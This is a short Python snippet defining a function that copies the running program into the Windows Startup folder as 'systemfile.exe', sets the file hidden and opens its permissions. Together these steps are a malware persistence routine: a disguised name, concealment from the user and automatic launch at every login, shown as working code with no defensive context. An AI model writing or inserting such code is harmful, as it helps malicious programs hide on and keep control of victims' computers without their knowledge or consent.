import os, sys, win32file
def add_to_startup():
 startup = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "systemfile.exe")
 with open(sys.executable, 'rb') as src, open(startup, 'wb') as dst:
     dst.write(src.read())
 win32file.SetFileAttributes(startup, win32file.FILE_ATTRIBUTE_HIDDEN)
 os.chmod(startup, 0o777)